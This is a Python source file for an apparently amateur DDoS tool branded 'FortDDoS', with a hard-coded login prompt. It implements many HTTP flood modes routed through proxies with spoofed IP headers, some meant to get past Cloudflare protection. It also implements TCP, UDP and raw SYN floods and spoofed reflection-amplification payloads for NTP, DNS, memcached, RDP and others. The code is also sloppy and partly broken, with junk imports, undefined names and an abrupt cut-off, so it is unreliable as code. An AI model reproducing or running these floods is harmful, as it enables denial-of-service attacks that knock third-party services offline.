# -*- coding: utf-8 -*-
from ast import arguments, excepthandler
from cgitb import text
from concurrent.futures import thread
from distutils.log import info
from email.errors import HeaderDefect
from http.client import HTTPConnection, HTTPSConnection
from itertools import count
from lib2to3.pgen2 import driver
from pickle import GET, NONE
from pickletools import stringnl_noescape_pair
from re import S
from sys import api_version
from telnetlib import TLS
import threading
from asyncio import sslproto
from asyncore import loop
from calendar import c
from multiprocessing.connection import Client, wait
from socket import IPPROTO_RAW, timeout
from tokenize import generate_tokens
from urllib.request import proxy_bypass
from weakref import proxy
from xml.dom.expatbuilder import CDATA_SECTION_NODE
import selenium
import webbrowser
import webdriver_manager
import websocket
import websockets
from selenium.webdriver.common.proxy import Proxy,ProxyType
from selenium import webdriver
import nmap
import undetected_chromedriver as uc
import undetected_chromedriver.v2 as uc
from contextlib import suppress, contextmanager
from functools import partial
from itertools import cycle
from json import load
from math import trunc, log2
from multiprocessing import Pool
from os import urandom as randbytes
from pathlib import Path
from random import randint, choice as randchoice
from re import compile
from socket import (IP_HDRINCL, IPPROTO_IP, inet_ntoa, IPPROTO_TCP, TCP_NODELAY, SOCK_STREAM, AF_INET, SOL_TCP, socket,
                    SOCK_DGRAM, SOCK_RAW, gethostname)
from ssl import SSLContext, create_default_context, CERT_NONE
from string import ascii_letters
from struct import pack as data_pack
from sys import argv, exit
from threading import Thread, Event
from time import sleep
from typing import Set, List, Any, Tuple

from certifi import where
from cloudscraper import create_scraper
from icmplib import ping
from impacket.ImpactPacket import IP, TCP, UDP, Data
from psutil import process_iter, net_io_counters, virtual_memory, cpu_percent
from requests import get, Session, exceptions
from socks import socksocket, HTTP, SOCKS5, SOCKS4
from yarl import URL
import random
import sys
import string
from urllib3.util import ssl_
username = input("Username :")
if username == "root":
    print("checking credentials...")
    sleep(1)
    print("Correct")
    pass
else:
    print("Incorrect")
    sleep(1)
    print("Try again")
    sleep(2)
    sys.exit(1)
if username == "fortniblox":
    pass
contraseña = input("Password :")
if contraseña == "rootyone":
        print("Checking credentials...")
        sleep(1)
        print("Access Granted!")
        pass
else:
        print("Wrong credentials")
        sleep(1)
        print("Try again")
        sleep(2)
        sys.exit(1)
if contraseña == "hola1234@#":
        pass

class color:
   PURPLE = '\033[95m'
   BLUE = '\033[94m'
   CYAN = '\033[96m'
   RED = '\033[91m'
   GREEN = '\033[92m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'  


l7 = ["CFB","GET","NULL","POST","OVH","HEAD","POSTV2","SPAMMER","GETV2","HTTPFAST","HTTPFASTV2","BYPASS","BYPASSV2","CFBV2","HTTP_BETA","CFUAM","BROWSERENGINE"]
l4 = ["TCP", "UDP", "SYN", "VSE", "NTP"]
l3 = [""]
to = [""]
ot = [""]
methods = l7
methodsl = l7 + l4 + l3 + to + ot

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled


def start_attack(method, threads, event, socks_type):
    global out_file
    # layer7
    cmethod = str(method.upper())
    if (cmethod != "SLOW") and (cmethod not in l4) and (cmethod not in l3) and (cmethod != "OSTRESS"):
        out_file = str("files/proxys/" + sys.argv[5])
        proxydl(out_file, socks_type)
        print("""                                          
                 ╔════╗           ╔╗ ╔═══╗          ╔╗
                 ║╔╗╔╗║          ╔╝╚╗║╔═╗║          ║║
                 ╚╝║║╠╩╦══╦══╦══╦╩╗╔╝║╚══╦══╦╗╔╦══╦═╝║
                   ║║║╔╣╔╗║╔═╣ ═╣╔╣║ ╚══╗║╔╗║║║║╔╗║╔╗║
                   ║║║║║╔╗║╚═╣ ═╣║║╚╗║╚═╝║╚╝║╚╝║╔╗║╚╝║
                   ╚╝╚╝╚╝╚╩══╩══╩╝╚═╝╚═══╩═╗╠══╩╝╚╩══╝
                                           ╚╝ 
                ╔═➤ Atttack His Been Distributed  
                ╠═══════════════════════════════════════
                ║ ● METHOD: [{}]
                ║ ● TARGET: [{}]       
                ║ ● PORT: [{}]
                ╠═══════════════════════════════════════
                ║ ● THREADS: [{}]           
                ║ ● TIME: [{}]             
                ║ ● PROXY: [{}]                 
                ╚═══════════════════════════════════════                               			                        

   
                """.format(method, target, port, threads, sys.argv[7],len(proxies), str(nums)))
    else:
        print("{} Attack Started To {}:{} For {} Seconds".format(method, target, port, sys.argv[7]))
    try:
        if method == "post":
            for _ in range(threads):
                threading.Thread(target=post, args=(event, socks_type), daemon=True).start()
        elif method == "postv2":
            for _ in range(threads):
                threading.Thread(target=postv2, args=(event, socks_type), daemon=True).start()
        elif method == "get":
            for _ in range(threads):
                threading.Thread(target=http, args=(event, socks_type), daemon=True).start()
        elif method == "cfb":
            for _ in range(threads):
                threading.Thread(target=cfb, args=(event, socks_type), daemon=True).start()
        elif method == "getv2":
            for _ in range(threads):
                threading.Thread(target=getv2, args=(event, socks_type), daemon=True).start()
        elif method == "httpfast":
            for _ in range(threads):
                threading.Thread(target=httpfast, args=(event, socks_type), daemon=True).start()
        elif method == "head":
            for _ in range(threads):
                threading.Thread(target=head, args=(event, socks_type), daemon=True).start()
        elif method == "ovh":
            for _ in range(threads):
                threading.Thread(target=ovh, args=(event, socks_type), daemon=True).start()
        elif method == "null":
            for _ in range(threads):
                threading.Thread(target=null, args=(event, socks_type), daemon=True).start()
        elif method == "nullhead":
            for _ in range(threads):
                threading.Thread(target=nullhead, args=(event, socks_type), daemon=True).start()
        elif method == "httpfastv2":
            for _ in range(threads):
                threading.Thread(target=httpfastv2, args=(event, socks_type), daemon=True).start()
        elif method == "spammer":
            for _ in range(threads):
                threading.Thread(target=spammer, args=(event, socks_type), daemon=True).start()
        elif method == "bypass":
            for _ in range(threads):
                threading.Thread(target=bypass, args=(event, socks_type), daemon=True).start()
        elif method == "bypassv2":
            for _ in range(threads):
                threading.Thread(target=bypassv2, args=(event, socks_type), daemon=True).start()
        elif method == "cfbv2":
            for _ in range(threads):
                threading.Thread(target=cfbv2, args=(event, socks_type), daemon=True).start()
        elif method == "socket":
            for _ in range(threads):
                threading.Thread(target=socket, args=(event, socks_type), daemon=True).start()
        elif method == "cfuam":
            for _ in range(threads):
                threading.Thread(target=cfuam, args=(event, socks_type), daemon=True).start()
        elif method == "browserengine":
            for _ in range(threads):
                threading.Thread(target=browserengine, args=(event, socks_type), daemon=True).start()
    except:
        pass


def random_data():
    return str(Choice(strings) + str(Intn(0, 271400281257)) + Choice(strings) + str(Intn(0, 271004281257)) + Choice(
        strings) + Choice(strings) + str(Intn(0, 271400281257)) + Choice(strings) + str(Intn(0, 271004281257)) + Choice(
        strings))


def Headers(method):
    header = ""
    if method == "get" or method == "getv2" or method == "socket" or method == "httpfast" or method == "httpfastv2" or method == "head" or method == "browserengine":
        connection = "Connection: Keep-Alive\r\n"
        accept = Choice(acceptall) + "\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = referer + useragent + accept + connection + "\r\n\r\n"
    elif method == "ovh":
        accept = Choice(acceptall) + "\r\n"
        more = "Connection: keep-alive\r\n"
        connection = "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        up = "Upgrade-Insecure-Requests: 1\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = useragent + more + accept + up  +  "\r\n\r\n"
    elif method == "null" or method == "cfuam" or method == "bypass":
        connection = "Connection: null\r\n"
        accept = Choice(acceptall) + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: "  + spoofer() + "\r\n"
        referer = "Referer: null\r\n"
        useragent = "User-Agent: null\r\n"
        header = referer + useragent + accept + connection + "\r\n\r\n"
    elif method == "spammer" or method == "postv2" or method == "post" or method == "httpfastv2":
        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        refer = "Referer: http://"  + target + path + "\r\n"
        user_agent = "User-Agent: " + UserAgent + "\r\n"
        connection = "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: "  + spoofer() + "\r\n"
        accept = Choice(acceptall) + "\r\n"
        data = str(random._urandom(8))
        length = "Content-Length:  " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
        header = post_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
    return header


def UrlFixer(original_url):
    global target, path, port, protocol
    original_url = original_url.strip()
    url = ""
    path = "/"
    port = 80
    protocol = "http"
    if original_url[:7] == "http://":
        url = original_url[7:]
    elif original_url[:8] == "https://":
        url = original_url[8:]
        protocol = "https"
    tmp = url.split("/")
    website = tmp[0]
    check = website.split(":")
    if len(check) != 1:
        port = int(check[1])
    else:
        if protocol == "https":
            port = 443
    target = check[0]
    if len(tmp) > 1:
        path = url.replace(website, "", 1)

servers = (random.randint(100,500))
sys.stdout.write("\x1b]2;FortDDoS. | Servers Online: [{}] \x07".format (servers))

class DNSQuery:
    def __init__(self, data):
        self.data = data
        self.dominio = ''
        self.DnsType = ''

        HDNS=data[-4:-2].encode("hex")
        if HDNS == "0001":
            self.DnsType='A'
        elif HDNS == "000f":
            self.DnsType='MX'
        elif HDNS == "0002":
            self.DnsType='NS'
        elif HDNS == "0010":
            self.DnsType="TXT"
        else:
            self.DnsType="Unknown"

        tipo = (ord(data[2]) >> 3) & 15   # Opcode bits
        if tipo == 0:                     # Standard query
            ini=12
            lon=ord(data[ini])
            while lon != 0:
                self.dominio+=data[ini+1:ini+lon+1]+'.'
                ini+=lon+1
                lon=ord(data[ini])
    def respuesta(self, ip):
        packet=''
        if self.dominio:
            packet+=self.data[:2] + "\x81\x80"
            packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Questions and Answers Counts
            packet+=self.data[12:]                                         # Original Domain Name Question
            packet+='\xc0\x0c'                                             # Pointer to domain name
            packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Response type, ttl and resource data length -> 4 bytes
            packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # 4bytes of IP
        return packet

class Proxy:
    port: int
    host: str
    typeInt: int

    def __init__(self, host: str, port: int, typeInt: int) -> None:
        self.host = host
        self.port = port
        self.typeInt = typeInt
        self._typeName = "SOCKS4" if typeInt == 4 else \
            "SOCKS5" if typeInt == 5 else \
                "HTTP"

    def __str__(self):
        return "%s:%d" % (self.host, self.port)

    def __repr__(self):
        return "%s:%d" % (self.host, self.port)

    def Check(self, url: str = "https://google.com", timeout: int = 1) -> bool:
        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError):
            return get(url, proxies=self.toRequests(), timeout=timeout).status_code not in [403, 400]
        return False

    def toRequests(self):
        return {'http': "%s://%s:%d" % (self._typeName.lower(),
                                        self.host,
                                        self.port)}

class Layer4(Thread):
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle

    def __init__(self, target: Tuple[str, int],
                 ref: List[str] = None,
                 method: str = "TCP",
                 synevent: Event = None):
        super().__init__(daemon=True)
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self._method = method
        self._target = target
        self._synevent = synevent

    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    def select(self, name):
        self.SENT_FLOOD = self.TCP
        if name == "UDP": self.SENT_FLOOD = self.UDP
        if name == "SYN": self.SENT_FLOOD = self.SYN
        if name == "VSE": self.SENT_FLOOD = self.VSE
        if name == "MINECRAFT": self.SENT_FLOOD = self.MINECRAFT
        if name == "RDP":
            self._amp_payload = (b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00', 3389)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "MEM":
            self._amp_payload = (b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "CHAR":
            self._amp_payload = (b'\x01', 19)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "ARD":
            self._amp_payload = (b'\x00\x14\x00\x00', 3283)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "NTP":
            self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "DNS":
            self._amp_payload = (b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
                                 b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00', 53)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())

    def TCP(self) -> None:
        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                socket(AF_INET, SOCK_STREAM, SOL_TCP) as s:
            s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
            s.connect(self._target)
            while s.send(randbytes(1024)):
                continue

    def MINECRAFT(self) -> None:
        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                socket(AF_INET, SOCK_STREAM, SOL_TCP) as s:
            s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
            s.connect(self._target)

            s.send(b'\x0f\x1f0\t' + self._target[0].encode() + b'\x0fA')

            while s.send(b'\x01'):
                s.send(b'\x00')

    def UDP(self) -> None:
        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                socket(AF_INET, SOCK_DGRAM) as s:
            while s.sendto(randbytes(1024), self._target):
                continue

    def SYN(self) -> None:
        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while s.sendto(self._genrate_syn(), self._target):
                continue

    def AMP(self) -> None:
        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while s.sendto(*next(self._amp_payloads)):
                continue

    def VSE(self) -> None:
        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                socket(AF_INET, SOCK_DGRAM) as s:
            while s.sendto((b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                            b'\x20\x51\x75\x65\x72\x79\x00'), self._target):
                continue

    def _genrate_syn(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(localIP)
        ip.set_ip_dst(self._target[0])
        tcp: TCP = TCP()
        tcp.set_SYN()
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(randint(1, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _generate_amp(self):
        payloads = []
        for ref in self._ref:
            ip: IP = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)

            ud: UDP = UDP()
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])

            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)

            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads


class HttpFlood(Thread):
    _proxies: cycle = None
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: Any
    SENT_FLOOD: Any

    def __init__(self, target: URL, method: str = "GET", rpc: int = 1,
                 synevent: Event = None, useragents: Set[str] = None,
                 referers: Set[str] = None,
                 proxy_type: int = 1,
                 proxies: Set[Proxy] = None) -> None:
        super().__init__(daemon=True)
        self.SENT_FLOOD = None
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._proxy_type = self.getProxyType(list(({proxy_type} & {1, 4, 5}) or 1)[0])
        self._target = target
        if not referers:
            referers: List[str] = ["https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                                   ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer"
                                   "/sharer.php?u=",
                                   ",https://drive.google.com/viewerng/viewer?url=",
                                   ",https://www.google.com/translate?u="]
        self._referers = list(referers)
        if proxies:
            self._proxies = cycle(proxies)
        if not useragents:
            useragents: List[str] = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0']
        self._useragents = list(useragents)
        self._req_type = self.getMethodType(method)
        self._defaultpayload = "%s %s HTTP/1.1\r\n" % (self._req_type, target.raw_path_qs)
        self._payload = (self._defaultpayload +
                         'Accept-Encoding: gzip, deflate, br\r\n'
                         'Accept-Language: en-US,en;q=0.9\r\n'
                         'Cache-Control: max-age=0\r\n'
                         'Connection: Keep-Alive\r\n'
                         'Sec-Fetch-Dest: document\r\n'
                         'Sec-Fetch-Mode: navigate\r\n'
                         'Sec-Fetch-Site: none\r\n'
                         'Sec-Fetch-User: ?1\r\n'
                         'Sec-Gpc: 1\r\n'
                         'Pragma: no-cache\r\n'
                         'Upgrade-Insecure-Requests: 1\r\n')

    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    @property
    def SpoofIP(self) -> str:
        spoof: str = Tools.randIPv4()
        payload: str = ""
        payload += "X-Forwarded-Proto: Http\r\n"
        payload += f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
        payload += f"Via: {spoof}\r\n"
        payload += f"Client-IP: {spoof}\r\n"
        payload += f'X-Forwarded-For: {spoof}\r\n'
        payload += f'Real-IP: {spoof}\r\n'
        return payload

    def generate_payload(self, other: str = None) -> bytes:
        payload: str | bytes = self._payload
        payload += "Host: %s\r\n" % self._target.authority
        payload += self.randHeadercontent
        payload += other if other else ""
        return str.encode(f"{payload}\r\n")

    def setup_socksocket(self, sock) -> socksocket:
        if self._proxies:
            proxy: Proxy = next(self._proxies)
            sock.set_proxy(self._proxy_type, proxy.host, proxy.port)
        if self._target.scheme == "https":
            sock = ctx.wrap_socket(sock, server_hostname=self._target.host, server_side=False,
                                   do_handshake_on_connect=True, suppress_ragged_eofs=True)
        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.connect((self._target.host, self._target.port or 80))
        return sock

    @property
    def randHeadercontent(self) -> str:
        payload: str = ""
        payload += f"User-Agent: {randchoice(self._useragents)}\r\n"
        payload += f"Referrer: {randchoice(self._referers)}\r\n"
        payload += self.SpoofIP
        return payload

    @staticmethod
    def getMethodType(method: str) -> str:
        return "GET" if {method.upper()} & {"CFB", "CFBV2", "GETV2", "POST", "POSTV2",
                                            "CFUAM", "HTTPFAST", "HTTPFASTV2", "SPAMMER"} \
            else "POST" if {method.upper()} & {"BYPASS"} \
            else "HEAD" if {method.upper()} & {"BYPASSV2", "NULL"} \
            else "REQUESTS"


def http(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def head(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("head")
    head_host = "HEAD " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = head_host + header
    event.wait()
    s = socks.socksocket()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()
            
def nullhead(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("null")
    head_host = "HEAD " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = head_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def httpfast(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                sleep(2)
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()
def browserengine(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.socksocket(socket.IPPROTO_TCP, socket.TCP_NODELAY)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
                s.driver = webdriver.Chrome()
                s.driver.get(target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()



def ovh(event, socks_type):
    header = Headers("ovh")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + "/" + str(Intn(1111111111, 9999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()

def httpfastv2(event, socks_type):
    header = Headers("post")
    proxy = Choice(proxies).strip().split(":")
    post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = post_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP,socket.TCP_FASTOPEN, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = SSLContext()
                ctx.post_handshake_auth = True
                s = ctx.wrap_socket(s, server_hostname=target,do_handshake_on_connect=True)
            try:
                sleep(1)
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()            



def cfuam(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("null")
    get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s.DEFAULT_CIPHERS = "ECDH+AESGCM:ECDH+CHACHA20:ECDH+AES256:ECDH+AES128:!aNULL:!SHA1:!AESCCM"
                session = requests.session()
                session.headers = Headers("get")
                scraper = cfscrape.create_scraper(sess=session)
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                sleep(1.5)
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()  


def bypass(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("null")
    get_host = "GET " + path + "?q=" + str(Intn(000000000, 999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target,do_handshake_on_connect=True)
                s.DEFAULT_CIPHERS = "ECDH+AESGCM:ECDH+CHACHA20:ECDH+AES256:ECDH+AES128:!aNULL:!SHA1:!AESCCM"
                ctx.get_ca_certs = True
                ctx.load_default_certs = True
                cfscrape.create_scraper(sess=None)
            try:
                sleep(1)
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()

def bypassv2(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("head")
    head_host = "HEAD " + path + "?q=" + str(Intn(000000000, 999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = head_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
                s = cfscrape.create_scraper(sess=target)
                s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
            try:
                sleep(1.5)
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def cfbv2(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
